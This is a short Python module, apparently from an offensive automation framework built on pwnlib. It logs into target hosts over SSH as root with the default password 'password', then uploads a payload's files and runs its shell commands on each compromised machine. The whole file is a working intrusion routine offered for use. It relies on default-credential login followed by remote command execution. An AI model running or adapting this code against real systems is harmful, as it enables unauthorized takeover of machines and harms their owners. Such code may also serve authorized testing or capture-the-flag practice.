#!/usr/bin/python3

from .base import Module
import socket
import time
from pwnlib.tubes.ssh import ssh
from ..payloads.basicpayload import BasicPayload

class SSHDefaultPassword(Module):
    """Exploits the ssh default passwords (Primary Module)"""

    payload = BasicPayload() # No payload required

    def detect(self, target):
        """Try to connect with the default credentials"""
        try:
            s = ssh(host=target['ip'], user="root", password="password")
            return s
        except:
            return None

    def compromise(self, target, detect_val):
        """Perform the exploitation"""

        # detect_val should be ssh shell we used to test for compromise
        # Saves an open socket

        try:
            for i in self.payload.files.keys():
                detect_val.upload_file(i, self.payload.files[i])
            for i in self.payload.steps():
                detect_val.shell(i)

            detect_val.close()
        except:
            import traceback
            traceback.print_exc()

        return True

